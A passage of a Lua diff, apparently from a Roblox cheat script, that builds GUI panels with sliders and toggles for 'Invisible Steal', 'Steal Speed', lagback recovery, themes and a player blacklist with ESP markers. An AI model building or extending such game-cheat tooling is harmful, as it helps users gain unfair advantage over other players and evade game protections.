+    makeToggle(iS,"Auto Fix Lagback",function() return _G.AutoRecoverLagback end,function(v) _G.AutoRecoverLagback=v; Config.AutoRecoverLagback=v; SaveConfig() end,1)
+
+    do  -- Rotation slider
+        local r = Instance.new("Frame", iS)
+        r.Size = UDim2.new(1,0,0,52)
+        r.BackgroundColor3 = C().SURF
+        r.BorderSizePixel = 0
+        r.LayoutOrder = 2
+        Instance.new("UICorner", r).CornerRadius = UDim.new(0,7)
+        local rl = Instance.new("TextLabel", r)
+        rl.Size = UDim2.new(1,-20,0,18)
+        rl.Position = UDim2.new(0,10,0,4)
+        rl.BackgroundTransparency = 1
+        rl.Text = "Rotation: "..Config.InvisStealAngle
+        rl.Font = Enum.Font.GothamBold
+        rl.TextSize = 12
+        rl.TextColor3 = C().TP
+        rl.TextXAlignment = Enum.TextXAlignment.Left
+        local rbg = Instance.new("Frame", r)
+        rbg.Size = UDim2.new(1,-20,0,6)
+        rbg.Position = UDim2.new(0,10,0,32)
+        rbg.BackgroundColor3 = C().SH
+        rbg.BorderSizePixel = 0
+        Instance.new("UICorner", rbg).CornerRadius = UDim.new(1,0)
+        local rfill = Instance.new("Frame", rbg)
+        rfill.BackgroundColor3 = Theme.Accent1
+        rfill.BorderSizePixel = 0
+        Instance.new("UICorner", rfill).CornerRadius = UDim.new(1,0)
+        local rk = Instance.new("Frame", rbg)
+        rk.Size = UDim2.new(0,13,0,13)
+        rk.AnchorPoint = Vector2.new(0.5,0.5)
+        rk.BackgroundColor3 = Color3.new(1,1,1)
+        rk.BorderSizePixel = 0
+        Instance.new("UICorner", rk).CornerRadius = UDim.new(1,0)
+        local function updRot(v)
+            v = math.clamp(math.floor(v),180,360)
+            Config.InvisStealAngle=v; _G.InvisStealAngle=v; SaveConfig()
+            rl.Text = "Rotation: "..v
+            local p2 = (v-180)/180
+            rfill.Size = UDim2.new(p2,0,1,0)
+            rk.Position = UDim2.new(p2,0,0.5,0)
+        end
+        updRot(Config.InvisStealAngle)
+        local rd = false
+        rbg.InputBegan:Connect(function(i)
+            if i.UserInputType==Enum.UserInputType.MouseButton1 or i.UserInputType==Enum.UserInputType.Touch then
+                rd=true; updRot(180+((i.Position.X-rbg.AbsolutePosition.X)/rbg.AbsoluteSize.X)*180)
+            end
+        end)
+        UserInputService.InputEnded:Connect(function(i)
+            if i.UserInputType==Enum.UserInputType.MouseButton1 or i.UserInputType==Enum.UserInputType.Touch then rd=false end
+        end)
+        UserInputService.InputChanged:Connect(function(i)
+            if rd and (i.UserInputType==Enum.UserInputType.MouseMovement or i.UserInputType==Enum.UserInputType.Touch) then
+                updRot(180+((i.Position.X-rbg.AbsolutePosition.X)/rbg.AbsoluteSize.X)*180)
+            end
+        end)
+    end
+
+    do  -- Depth slider
+        local r = Instance.new("Frame", iS)
+        r.Size = UDim2.new(1,0,0,52)
+        r.BackgroundColor3 = C().SURF
+        r.BorderSizePixel = 0
+        r.LayoutOrder = 3
+        Instance.new("UICorner", r).CornerRadius = UDim.new(0,7)
+        local rl = Instance.new("TextLabel", r)
+        rl.Size = UDim2.new(1,-20,0,18)
+        rl.Position = UDim2.new(0,10,0,4)
+        rl.BackgroundTransparency = 1
+        rl.Text = "Depth: "..Config.SinkSliderValue
+        rl.Font = Enum.Font.GothamBold
+        rl.TextSize = 12
+        rl.TextColor3 = C().TP
+        rl.TextXAlignment = Enum.TextXAlignment.Left
+        local rbg = Instance.new("Frame", r)
+        rbg.Size = UDim2.new(1,-20,0,6)
+        rbg.Position = UDim2.new(0,10,0,32)
+        rbg.BackgroundColor3 = C().SH
+        rbg.BorderSizePixel = 0
+        Instance.new("UICorner", rbg).CornerRadius = UDim.new(1,0)
+        local rfill = Instance.new("Frame", rbg)
+        rfill.BackgroundColor3 = Theme.Accent1
+        rfill.BorderSizePixel = 0
+        Instance.new("UICorner", rfill).CornerRadius = UDim.new(1,0)
+        local rk = Instance.new("Frame", rbg)
+        rk.Size = UDim2.new(0,13,0,13)
+        rk.AnchorPoint = Vector2.new(0.5,0.5)
+        rk.BackgroundColor3 = Color3.new(1,1,1)
+        rk.BorderSizePixel = 0
+        Instance.new("UICorner", rk).CornerRadius = UDim.new(1,0)
+        local function updDepth(v)
+            v = math.clamp(math.floor(v*10)/10, 0.5, 10)
+            Config.SinkSliderValue=v; _G.SinkSliderValue=v; SaveConfig()
+            rl.Text = "Depth: "..v
+            local p2 = (v-0.5)/9.5
+            rfill.Size = UDim2.new(p2,0,1,0)
+            rk.Position = UDim2.new(p2,0,0.5,0)
+        end
+        updDepth(Config.SinkSliderValue)
+        local dd = false
+        rbg.InputBegan:Connect(function(i)
+            if i.UserInputType==Enum.UserInputType.MouseButton1 or i.UserInputType==Enum.UserInputType.Touch then
+                dd=true; updDepth(0.5+((i.Position.X-rbg.AbsolutePosition.X)/rbg.AbsoluteSize.X)*9.5)
+            end
+        end)
+        UserInputService.InputEnded:Connect(function(i)
+            if i.UserInputType==Enum.UserInputType.MouseButton1 or i.UserInputType==Enum.UserInputType.Touch then dd=false end
+        end)
+        UserInputService.InputChanged:Connect(function(i)
+            if dd and (i.UserInputType==Enum.UserInputType.MouseMovement or i.UserInputType==Enum.UserInputType.Touch) then
+                updDepth(0.5+((i.Position.X-rbg.AbsolutePosition.X)/rbg.AbsoluteSize.X)*9.5)
+            end
+        end)
+    end
+
+    -- ── TEMAS TAB ──
+    local tS = tScrolls2["tem"]
+    do
+        local TDEFS2 = {
+            {"Black",  "preto",    Color3.fromRGB(170,170,170)},
+        }
+        for i2, td2 in ipairs(TDEFS2) do
+            local r = Instance.new("Frame", tS)
+            r.Size = UDim2.new(1,0,0,36)
+            r.BackgroundColor3 = C().SURF
+            r.BorderSizePixel = 0
+            r.LayoutOrder = i2
+            Instance.new("UICorner", r).CornerRadius = UDim.new(0,7)
+
+            local dot2 = Instance.new("Frame", r)
+            dot2.Size = UDim2.new(0,12,0,12)
+            dot2.Position = UDim2.new(0,12,0.5,-6)
+            dot2.BackgroundColor3 = td2[3]
+            dot2.BorderSizePixel = 0
+            Instance.new("UICorner", dot2).CornerRadius = UDim.new(1,0)
+
+            local nl = Instance.new("TextLabel", r)
+            nl.Size = UDim2.new(0.5,0,1,0)
+            nl.Position = UDim2.new(0,32,0,0)
+            nl.BackgroundTransparency = 1
+            nl.Text = td2[1]
+            nl.Font = Enum.Font.GothamBold
+            nl.TextSize = 12
+            nl.TextColor3 = C().TP
+            nl.TextXAlignment = Enum.TextXAlignment.Left
+
+            local isActive = (Config.CurrentTheme == td2[2])
+            local apb = Instance.new("TextButton", r)
+            apb.Size = UDim2.new(0,72,0,24)
+            apb.Position = UDim2.new(1,-80,0.5,-12)
+            apb.BackgroundColor3 = isActive and td2[3] or C().SH
+            apb.Text = isActive and "ACTIVE" or "APPLY"
+            apb.Font = Enum.Font.GothamBold
+            apb.TextSize = 10
+            apb.TextColor3 = isActive and Color3.new(0,0,0) or C().TP
+            apb.AutoButtonColor = false
+            Instance.new("UICorner", apb).CornerRadius = UDim.new(0,5)
+            local tid2 = td2[2]; local tc2 = td2[3]
+            apb.MouseButton1Click:Connect(function()
+                applyTheme(tid2)
+                -- atualiza visual de todos os botoes
+                for _, ch in ipairs(tS:GetChildren()) do
+                    local b2 = ch:FindFirstChildOfClass("TextButton")
+                    if b2 then
+                        b2.BackgroundColor3 = C().SH
+                        b2.Text = "APPLY"
+                        b2.TextColor3 = C().TP
+                    end
+                end
+                apb.BackgroundColor3 = tc2
+                apb.Text = "ACTIVE"
+                apb.TextColor3 = Color3.new(0,0,0)
+            end)
+        end
+    end
+
+    -- ── BLACKLIST TAB ──
+    local blS = tScrolls2["bl"]
+
+    -- ESP config for blacklisted players
+    makeSec(blS, "BLACKLIST ESP", 0)
+    makeToggle(blS, "Show Blacklist ESP", function() return Config.BlacklistESP ~= false end, function(v)
+        Config.BlacklistESP = v; SaveConfig()
+        if not v then
+            for _, p in ipairs(Players:GetPlayers()) do
+                local char = p.Character
+                if char then
+                    local existing = char:FindFirstChild("BullysBlacklistESP")
+                    if existing then existing:Destroy() end
+                end
+            end
+        end
+    end, 1)
+
+    -- Custom message row
+    local blMsgRow = Instance.new("Frame", blS)
+    blMsgRow.Size             = UDim2.new(1,0,0,36)
+    blMsgRow.BackgroundColor3 = C().SURF
+    blMsgRow.BackgroundTransparency = 0.05
+    blMsgRow.BorderSizePixel  = 0
+    blMsgRow.LayoutOrder      = 2
+    Instance.new("UICorner", blMsgRow).CornerRadius = UDim.new(0,7)
+    local blMsgLbl = Instance.new("TextLabel", blMsgRow)
+    blMsgLbl.Size             = UDim2.new(0,60,1,0)
+    blMsgLbl.Position         = UDim2.new(0,8,0,0)
+    blMsgLbl.BackgroundTransparency = 1
+    blMsgLbl.Text             = "Mensagem"
+    blMsgLbl.Font             = Enum.Font.GothamBold
+    blMsgLbl.TextSize         = 11
+    blMsgLbl.TextColor3       = C().TP
+    blMsgLbl.TextXAlignment   = Enum.TextXAlignment.Left
+    local blMsgBox = Instance.new("TextBox", blMsgRow)
+    blMsgBox.Size             = UDim2.new(1,-78,0,24)
+    blMsgBox.Position         = UDim2.new(0,72,0.5,-12)
+    blMsgBox.BackgroundColor3 = C().SH
+    blMsgBox.Text             = Config.BlacklistMsg or "BLOCKED"
+    blMsgBox.PlaceholderText  = "BLOCKED"
+    blMsgBox.Font             = Enum.Font.GothamBold
+    blMsgBox.TextSize         = 11
+    blMsgBox.TextColor3       = C().TP
+    blMsgBox.ClearTextOnFocus = false
+    blMsgBox.BorderSizePixel  = 0
+    Instance.new("UICorner", blMsgBox).CornerRadius = UDim.new(0,5)
+    blMsgBox.FocusLost:Connect(function()
+        local msg = blMsgBox.Text:gsub("%s+", " "):match("^%s*(.-)%s*$")
+        if msg == "" then msg = "BLOCKED" end
+        Config.BlacklistMsg = msg; SaveConfig()
+        blMsgBox.Text = msg
+        -- Live-update all existing ESP labels
+        for _, p in ipairs(Players:GetPlayers()) do
+            local char = p.Character
+            if char then
+                local bb = char:FindFirstChild("BullysBlacklistESP")
+                if bb then
+                    local lbl = bb:FindFirstChild("MsgLbl", true)
+                    if lbl then lbl.Text = msg end
+                end
+            end
+        end
+    end)
+
+    -- Input row
+    local blInputRow = Instance.new("Frame", blS)
+    blInputRow.Size = UDim2.new(1,0,0,44)
+    blInputRow.BackgroundColor3 = C().SURF
+    blInputRow.BorderSizePixel = 0
+    blInputRow.LayoutOrder = 1
+    Instance.new("UICorner", blInputRow).CornerRadius = UDim.new(0,7)
+
+    local blBox = Instance.new("TextBox", blInputRow)
+    blBox.Size = UDim2.new(1,-80,0,28)
+    blBox.Position = UDim2.new(0,8,0.5,-14)
+    blBox.BackgroundColor3 = C().SH
+    blBox.Text = ""
+    blBox.PlaceholderText = "Username..."
+    blBox.Font = Enum.Font.GothamBold
+    blBox.TextSize = 12
+    blBox.TextColor3 = C().TP
+    blBox.ClearTextOnFocus = false
+    blBox.BorderSizePixel = 0
+    Instance.new("UICorner", blBox).CornerRadius = UDim.new(0,6)
+
+    local blAddBtn = Instance.new("TextButton", blInputRow)
+    blAddBtn.Size = UDim2.new(0,60,0,28)
+    blAddBtn.Position = UDim2.new(1,-68,0.5,-14)
+    blAddBtn.BackgroundColor3 = Color3.fromRGB(180,40,40)
+    blAddBtn.Text = "ADD"
+    blAddBtn.Font = Enum.Font.GothamBold
+    blAddBtn.TextSize = 12
+    blAddBtn.TextColor3 = Color3.new(1,1,1)
+    blAddBtn.AutoButtonColor = false
+    blAddBtn.BorderSizePixel = 0
+    Instance.new("UICorner", blAddBtn).CornerRadius = UDim.new(0,6)
+
+    -- Counter label
+    local blCount = Instance.new("Frame", blS)
+    blCount.Size = UDim2.new(1,0,0,24)
+    blCount.BackgroundTransparency = 1
+    blCount.LayoutOrder = 2
+    local blCountLbl = Instance.new("TextLabel", blCount)
+    blCountLbl.Size = UDim2.new(1,0,1,0)
+    blCountLbl.BackgroundTransparency = 1
+    blCountLbl.Text = "BLACKLISTED (0)"
+    blCountLbl.Font = Enum.Font.GothamBlack
+    blCountLbl.TextSize = 11
+    blCountLbl.TextColor3 = Color3.fromRGB(180,40,40)
+    blCountLbl.TextXAlignment = Enum.TextXAlignment.Left
+
+    -- List container
+    local blListContainer = Instance.new("Frame", blS)
+    blListContainer.Size = UDim2.new(1,0,0,10) -- auto grows
+    blListContainer.BackgroundTransparency = 1
+    blListContainer.LayoutOrder = 3
+    blListContainer.AutomaticSize = Enum.AutomaticSize.Y
+    local blListLayout = Instance.new("UIListLayout", blListContainer)
+    blListLayout.Padding = UDim.new(0,4)
+    blListLayout.SortOrder = Enum.SortOrder.LayoutOrder
+
+    -- refreshBlacklistUI function
+    refreshBlacklistUI = function()
+        -- clear existing rows
+        for _, ch in ipairs(blListContainer:GetChildren()) do
+            if ch:IsA("Frame") then ch:Destroy() end
+        end
+        blCountLbl.Text = "BLACKLISTED (" .. #BlacklistedPlayers .. ")"
+
+        for i, name in ipairs(BlacklistedPlayers) do
+            local entRow = Instance.new("Frame", blListContainer)
+            entRow.Size = UDim2.new(1,0,0,36)
+            entRow.BackgroundColor3 = Color3.fromRGB(50,20,20)
+            entRow.BorderSizePixel = 0
+            entRow.LayoutOrder = i
+            Instance.new("UICorner", entRow).CornerRadius = UDim.new(0,7)
+            local entStroke = Instance.new("UIStroke", entRow)
+            entStroke.Color = Color3.fromRGB(180,40,40)
+            entStroke.Thickness = 1; entStroke.Transparency = 0.5
+
+            local iconLbl = Instance.new("TextLabel", entRow)
+            iconLbl.Size = UDim2.new(0,24,1,0)
+            iconLbl.Position = UDim2.new(0,6,0,0)
+            iconLbl.BackgroundTransparency = 1
+            iconLbl.Text = "🚫"
+            iconLbl.TextSize = 14
+            iconLbl.Font = Enum.Font.GothamBold
+            iconLbl.TextColor3 = Color3.fromRGB(255,100,100)
+
+            local nameLbl = Instance.new("TextLabel", entRow)
+            nameLbl.Size = UDim2.new(1,-70,1,0)
+            nameLbl.Position = UDim2.new(0,34,0,0)
+            nameLbl.BackgroundTransparency = 1
+            nameLbl.Text = name
+            nameLbl.Font = Enum.Font.GothamBold
+            nameLbl.TextSize = 12
+            nameLbl.TextColor3 = C().TP
+            nameLbl.TextXAlignment = Enum.TextXAlignment.Left
+            nameLbl.TextTruncate = Enum.TextTruncate.AtEnd
+
+            local remBtn = Instance.new("TextButton", entRow)
+            remBtn.Size = UDim2.new(0,50,0,24)
+            remBtn.Position = UDim2.new(1,-56,0.5,-12)
+            remBtn.BackgroundColor3 = C().SH
+            remBtn.Text = "❌"
+            remBtn.Font = Enum.Font.GothamBold
+            remBtn.TextSize = 13
+            remBtn.TextColor3 = Theme.TextPrimary
+            remBtn.AutoButtonColor = false
+            remBtn.BorderSizePixel = 0
+            Instance.new("UICorner", remBtn).CornerRadius = UDim.new(0,6)
+            local n = name
+            remBtn.MouseButton1Click:Connect(function()
+                pcall(function()
+                    removeFromBlacklist(n)
+                    ShowNotification("BLACKLIST", "✅ Removed: " .. n)
+                    refreshBlacklistUI()
+                end)
+            end)
+        end
+
+        if #BlacklistedPlayers == 0 then
+            local empty = Instance.new("TextLabel", blListContainer)
+            empty.Size = UDim2.new(1,0,0,36)
+            empty.BackgroundTransparency = 1
+            empty.Text = "No players blacklisted"
+            empty.Font = Enum.Font.GothamMedium
+            empty.TextSize = 12
+            empty.TextColor3 = C().TS
+            empty.LayoutOrder = 1
+        end
+    end
+    refreshBlacklistUI()
+
+    blAddBtn.MouseButton1Click:Connect(function()
+        pcall(function()
+            local name = blBox.Text:gsub("%s", "")
+            if name == "" then return end
+            if addToBlacklist(name) then
+                ShowNotification("BLACKLIST", "🚫 Blocked: " .. name)
+                blBox.Text = ""
+                refreshBlacklistUI()
+            else
+                ShowNotification("BLACKLIST", name .. " already blacklisted")
+            end
+        end)
+    end)
+
+    blBox.FocusLost:Connect(function(enter)
+        if enter then blAddBtn.MouseButton1Click:Fire() end
+    end)
+
+    switchTab2("act")
+
+    -- Expor ref global
+    _G.BullysSettingsUI = {panel=panel, switchTab=switchTab2, currentTab="cfg"}
+end
+task.spawn(buildBullysSettingsUI)
+
+task.spawn(function()
+    task.wait(1.5)
+    if Config.CurrentTheme and THEMES and THEMES[Config.CurrentTheme] then
+        applyTheme(Config.CurrentTheme)
+    end
+end)
+
+function buildMiniActionsUI()
+    local pg = PlayerGui
+    if not pg then return end
+    local oldG = pg:FindFirstChild("BullysMiniActions")
+    if oldG then oldG:Destroy() end
+
+    local maGui = Instance.new("ScreenGui")
+    maGui.Name = "BullysMiniActions"
+    maGui.ResetOnSpawn = false
+    maGui.DisplayOrder = 25
+    maGui.Parent = pg
+
+    -- Painel (conteúdo rolável — mais controles que a UI antiga)
+    local W = 252
+    local BTN_H = 28
+    local PANEL_H = 430
+
+    local panel = Instance.new("Frame", maGui)
+    panel.Name = "MiniPanel"
+    panel.Size = UDim2.new(0, W, 0, PANEL_H)
+    local savedPos = Config.MiniUIPos or {X=0.01, Y=0.35}
+    panel.Position = UDim2.new(savedPos.X, 0, savedPos.Y, 0)
+    panel.BackgroundColor3 = Theme.Background
+    panel.BackgroundTransparency = 0.08
+    panel.BorderSizePixel = 0
+    panel.Visible = not Config.AutoHideMiniUI
+    Instance.new("UICorner", panel).CornerRadius = UDim.new(0, 10)
+
+    local pStroke = Instance.new("UIStroke", panel)
+    pStroke.Color = Theme.Accent1
+    pStroke.Thickness = 1.2
+    pStroke.Transparency = 0.5
+
+    -- Header drag area
+    local header = Instance.new("Frame", panel)
+    header.Size = UDim2.new(1, 0, 0, 32)
+    header.BackgroundTransparency = 1
+
+    local titleLbl = Instance.new("TextLabel", header)
+    titleLbl.Size = UDim2.new(1, -60, 1, 0)
+    titleLbl.Position = UDim2.new(0, 10, 0, 0)
+    titleLbl.BackgroundTransparency = 1
+    titleLbl.Text = "ACTIONS"
+    titleLbl.Font = Enum.Font.GothamBlack
+    titleLbl.TextSize = 12
+    titleLbl.TextColor3 = Theme.Accent1
+    titleLbl.TextXAlignment = Enum.TextXAlignment.Left
+
+    -- Lock button
+    local lockBtn = Instance.new("TextButton", header)
+    lockBtn.Size = UDim2.new(0, 22, 0, 22)
+    lockBtn.Position = UDim2.new(1, -28, 0.5, -11)
+    lockBtn.BackgroundColor3 = Config.MiniUILocked and Theme.Accent1 or Theme.SurfaceHighlight
+    lockBtn.BackgroundTransparency = 0.1
+    lockBtn.Text = Config.MiniUILocked and "🔒" or "🔓"
+    lockBtn.Font = Enum.Font.GothamBold
+    lockBtn.TextSize = 12
+    lockBtn.TextColor3 = Color3.new(1,1,1)
+    lockBtn.AutoButtonColor = false
+    Instance.new("UICorner", lockBtn).CornerRadius = UDim.new(1, 0)
+    local lockStroke = Instance.new("UIStroke", lockBtn)
+    lockStroke.Color = Theme.Accent1
+    lockStroke.Thickness = 1
+    lockStroke.Transparency = 0.4
+
+    lockBtn.MouseButton1Click:Connect(function()
+        Config.MiniUILocked = not Config.MiniUILocked
+        SaveConfig()
+        lockBtn.Text = Config.MiniUILocked and "🔒" or "🔓"
+        lockBtn.BackgroundColor3 = Config.MiniUILocked and Theme.Accent1 or Theme.SurfaceHighlight
+    end)
+
+    -- Drag (only when not locked)
+    do
+        local dragging, dragStart, startPos
+        header.InputBegan:Connect(function(inp)
+            if Config.MiniUILocked then return end
+            if inp.UserInputType == Enum.UserInputType.MouseButton1 or inp.UserInputType == Enum.UserInputType.Touch then
+                dragging = true
+                dragStart = inp.Position
+                startPos = panel.Position
+                inp.Changed:Connect(function()
+                    if inp.UserInputState == Enum.UserInputState.End then
+                        dragging = false
+                        local ps = panel.Parent.AbsoluteSize
+                        Config.MiniUIPos = {
+                            X = panel.AbsolutePosition.X / ps.X,
+                            Y = panel.AbsolutePosition.Y / ps.Y,
+                        }
+                        SaveConfig()
+                    end
+                end)
+            end
+        end)
+        header.InputChanged:Connect(function(inp)
+            if inp.UserInputType == Enum.UserInputType.MouseMovement or inp.UserInputType == Enum.UserInputType.Touch then
+                if dragging and dragStart then
+                    local delta = inp.Position - dragStart
+                    panel.Position = UDim2.new(
+                        startPos.X.Scale, startPos.X.Offset + delta.X,
+                        startPos.Y.Scale, startPos.Y.Offset + delta.Y
+                    )
+                end
+            end
+        end)
+        UserInputService.InputChanged:Connect(function(inp)
+            if dragging and (inp.UserInputType == Enum.UserInputType.MouseMovement or inp.UserInputType == Enum.UserInputType.Touch) then
+                local delta = inp.Position - dragStart
+                panel.Position = UDim2.new(
+                    startPos.X.Scale, startPos.X.Offset + delta.X,
+                    startPos.Y.Scale, startPos.Y.Offset + delta.Y
+                )
+            end
+        end)
+    end
+
+    -- Divisor
+    local div = Instance.new("Frame", panel)
+    div.Size = UDim2.new(1, -16, 0, 1)
+    div.Position = UDim2.new(0, 8, 0, 32)
+    div.BackgroundColor3 = Theme.SurfaceHighlight
+    div.BorderSizePixel = 0
+
+    -- Content area (rolável)
+    local cont = Instance.new("ScrollingFrame", panel)
+    cont.Name = "MiniContent"
+    cont.Size = UDim2.new(1, -12, 1, -38)
+    cont.Position = UDim2.new(0, 6, 0, 36)
+    cont.BackgroundTransparency = 1
+    cont.BorderSizePixel = 0
+    cont.ScrollBarThickness = 0
+    cont.ScrollBarImageColor3 = Theme.Accent1
+    cont.CanvasSize = UDim2.new(0, 0, 0, 0)
+    cont.AutomaticCanvasSize = Enum.AutomaticSize.Y
+    cont.ScrollingDirection = Enum.ScrollingDirection.Y
+
+    local ll = Instance.new("UIListLayout", cont)
+    ll.Padding = UDim.new(0, 4)
+    ll.SortOrder = Enum.SortOrder.LayoutOrder
+
+    local function miniSec(lbl, ord)
+        local r = Instance.new("Frame", cont)
+        r.Size = UDim2.new(1, 0, 0, 12)
+        r.BackgroundTransparency = 1
+        r.LayoutOrder = ord
+        local t = Instance.new("TextLabel", r)
+        t.Size = UDim2.new(1, -6, 1, 0)
+        t.Position = UDim2.new(0, 2, 0, 0)
+        t.BackgroundTransparency = 1
+        t.Text = lbl
+        t.Font = Enum.Font.GothamBlack
+        t.TextSize = 8
+        t.TextColor3 = Theme.Accent1
+        t.TextXAlignment = Enum.TextXAlignment.Left
+    end
+
+    -- Helper: make action button
+    local function mBtn(lbl, order, col, cb)
+        local b = Instance.new("TextButton", cont)
+        b.Size = UDim2.new(1, 0, 0, BTN_H)
+        b.BackgroundColor3 = col or Theme.Surface
+        b.BackgroundTransparency = 0.05
+        b.Text = lbl
+        b.Font = Enum.Font.GothamBold
+        b.TextSize = 10
+        b.TextColor3 = Theme.TextPrimary
+        b.BorderSizePixel = 0
+        b.AutoButtonColor = false
+        b.LayoutOrder = order
+        Instance.new("UICorner", b).CornerRadius = UDim.new(0, 7)
+        local bs = Instance.new("UIStroke", b)
+        bs.Color = col or Theme.SurfaceHighlight
+        bs.Thickness = 1
+        bs.Transparency = 0.5
+        b.MouseEnter:Connect(function()
+            TweenService:Create(b, TweenInfo.new(0.1), {BackgroundTransparency=0}):Play()
+            TweenService:Create(bs, TweenInfo.new(0.1), {Transparency=0.1}):Play()
+        end)
+        b.MouseLeave:Connect(function()
+            TweenService:Create(b, TweenInfo.new(0.1), {BackgroundTransparency=0.05}):Play()
+            TweenService:Create(bs, TweenInfo.new(0.1), {Transparency=0.5}):Play()
+        end)
+        b.MouseButton1Click:Connect(cb)
+        return b
+    end
+
+    -- ── STEAL SPEED (slider 5–30, único controle visual) ─────────────────
+    miniSec("STEAL SPEED", 10)
+    do
+        local MIN_S, MAX_S = 5, 30
+        local r = Instance.new("Frame", cont)
+        r.Size = UDim2.new(1, 0, 0, 44)
+        r.BackgroundColor3 = Theme.Surface
+        r.BackgroundTransparency = 0.05
+        r.BorderSizePixel = 0
+        r.LayoutOrder = 11
+        Instance.new("UICorner", r).CornerRadius = UDim.new(0, 7)
+        local rl = Instance.new("TextLabel", r)
+        rl.Size = UDim2.new(1, -16, 0, 14)
+        rl.Position = UDim2.new(0, 8, 0, 4)
+        rl.BackgroundTransparency = 1
+        rl.Font = Enum.Font.GothamBold
+        rl.TextSize = 10
+        rl.TextColor3 = Theme.TextPrimary
+        rl.TextXAlignment = Enum.TextXAlignment.Left
+        local rbg = Instance.new("Frame", r)
+        rbg.Size = UDim2.new(1, -16, 0, 6)
+        rbg.Position = UDim2.new(0, 8, 0, 26)
+        rbg.BackgroundColor3 = Theme.SurfaceHighlight
+        rbg.BorderSizePixel = 0
+        Instance.new("UICorner", rbg).CornerRadius = UDim.new(1, 0)
+        local rfill = Instance.new("Frame", rbg)
+        rfill.BackgroundColor3 = Theme.Accent1
+        rfill.BorderSizePixel = 0
+        Instance.new("UICorner", rfill).CornerRadius = UDim.new(1, 0)
+        local rk = Instance.new("Frame", rbg)
+        rk.Size = UDim2.new(0, 12, 0, 12)
+        rk.AnchorPoint = Vector2.new(0.5, 0.5)
+        rk.BackgroundColor3 = Color3.new(1, 1, 1)
+        rk.BorderSizePixel = 0
+        Instance.new("UICorner", rk).CornerRadius = UDim.new(1, 0)
+
+        local function setVisual(v)
+            v = math.clamp(math.floor((tonumber(v) or MIN_S) + 0.5), MIN_S, MAX_S)
+            rl.Text = "Speed: " .. v .. "  (" .. MIN_S .. "–" .. MAX_S .. ")"
+            local p2 = (v - MIN_S) / (MAX_S - MIN_S)
+            rfill.Size = UDim2.new(p2, 0, 1, 0)
+            rk.Position = UDim2.new(p2, 0, 0.5, 0)
+        end
+
+        local function commitFromTrack(posX)
+            local t = math.clamp((posX - rbg.AbsolutePosition.X) / rbg.AbsoluteSize.X, 0, 1)
+            local v = math.floor(MIN_S + t * (MAX_S - MIN_S) + 0.5)
+            if SharedState and SharedState.applyStealSpeedValue then
+                pcall(SharedState.applyStealSpeedValue, v)
+            else
+                Config.StealSpeed = math.clamp(v, MIN_S, MAX_S)
+                SaveConfig()
+                setVisual(Config.StealSpeed)
+            end
+        end
+
+        SharedState._refreshMiniStealSpeedSlider = function()
+            setVisual(Config.StealSpeed or 20)
+        end
+        setVisual(math.clamp(math.floor((Config.StealSpeed or 20) + 0.5), MIN_S, MAX_S))
+
+        local sd = false
+        rbg.InputBegan:Connect(function(i)
+            if i.UserInputType == Enum.UserInputType.MouseButton1 or i.UserInputType == Enum.UserInputType.Touch then
+                sd = true
+                commitFromTrack(i.Position.X)
+            end
+        end)
+        UserInputService.InputEnded:Connect(function(i)
+            if i.UserInputType == Enum.UserInputType.MouseButton1 or i.UserInputType == Enum.UserInputType.Touch then sd = false end
+        end)
+        UserInputService.InputChanged:Connect(function(i)
+            if sd and (i.UserInputType == Enum.UserInputType.MouseMovement or i.UserInputType == Enum.UserInputType.Touch) then
+                commitFromTrack(i.Position.X)
+            end
+        end)
+    end
+
+    -- ── INVISIBLE STEAL ───────────────────────────────────────────────────
+    miniSec("INVISIBLE STEAL", 20)
+    local invisBtn = mBtn("Invisible Steal: OFF", 21, Theme.Surface, function() end)
+    local function updInvisMini()
+        local on = _G.invisibleStealEnabled
+        invisBtn.Text = on and "Invisible Steal: ON" or "Invisible Steal: OFF"
+        invisBtn.BackgroundColor3 = on and Theme.Accent1 or Theme.Surface
+        invisBtn.TextColor3 = on and Color3.new(0, 0, 0) or Theme.TextPrimary
+    end
+    updInvisMini()
+    invisBtn.MouseButton1Click:Connect(function()
+        if _G.toggleInvisibleSteal then pcall(_G.toggleInvisibleSteal) end
+        task.defer(updInvisMini)
+    end)
+
+    do
+        local r = Instance.new("Frame", cont)
+        r.Size = UDim2.new(1, 0, 0, 30)
+        r.BackgroundColor3 = Theme.Surface
+        r.BackgroundTransparency = 0.05
+        r.BorderSizePixel = 0
+        r.LayoutOrder = 22
+        Instance.new("UICorner", r).CornerRadius = UDim.new(0, 7)
+        local rl = Instance.new("TextLabel", r)
+        rl.Size = UDim2.new(0, 94, 1, 0)
+        rl.Position = UDim2.new(0, 8, 0, 0)
+        rl.BackgroundTransparency = 1
+        rl.Font = Enum.Font.GothamBold
+        rl.TextSize = 9
+        rl.TextColor3 = Theme.TextPrimary
+        rl.TextXAlignment = Enum.TextXAlignment.Left
+        local rbg = Instance.new("Frame", r)
+        rbg.Size = UDim2.new(1, -112, 0, 6)
+        rbg.Position = UDim2.new(0, 104, 0.5, -3)
+        rbg.BackgroundColor3 = Theme.SurfaceHighlight
+        rbg.BorderSizePixel = 0
+        Instance.new("UICorner", rbg).CornerRadius = UDim.new(1, 0)
+        local rfill = Instance.new("Frame", rbg)
+        rfill.BackgroundColor3 = Theme.Accent1
+        rfill.BorderSizePixel = 0
+        Instance.new("UICorner", rfill).CornerRadius = UDim.new(1, 0)
+        local rk = Instance.new("Frame", rbg)
+        rk.Size = UDim2.new(0, 10, 0, 10)
+        rk.AnchorPoint = Vector2.new(0.5, 0.5)
+        rk.BackgroundColor3 = Color3.new(1, 1, 1)
+        rk.BorderSizePixel = 0
+        Instance.new("UICorner", rk).CornerRadius = UDim.new(1, 0)
+        local function updRot(v)
+            v = math.clamp(math.floor(v), 0, 360)
+            Config.InvisStealAngle = v
+            _G.InvisStealAngle = v
+            SaveConfig()
+            rl.Text = "Rotation: " .. v
+            local p2 = v / 360
+            rfill.Size = UDim2.new(p2, 0, 1, 0)
+            rk.Position = UDim2.new(p2, 0, 0.5, 0)
+        end
+        updRot(Config.InvisStealAngle or 0)
+        local rd = false
+        rbg.InputBegan:Connect(function(i)
+            if i.UserInputType == Enum.UserInputType.MouseButton1 or i.UserInputType == Enum.UserInputType.Touch then
+                rd = true
+                updRot(((i.Position.X - rbg.AbsolutePosition.X) / rbg.AbsoluteSize.X) * 360)
+            end
+        end)
+        UserInputService.InputEnded:Connect(function(i)
+            if i.UserInputType == Enum.UserInputType.MouseButton1 or i.UserInputType == Enum.UserInputType.Touch then rd = false end
+        end)
+        UserInputService.InputChanged:Connect(function(i)
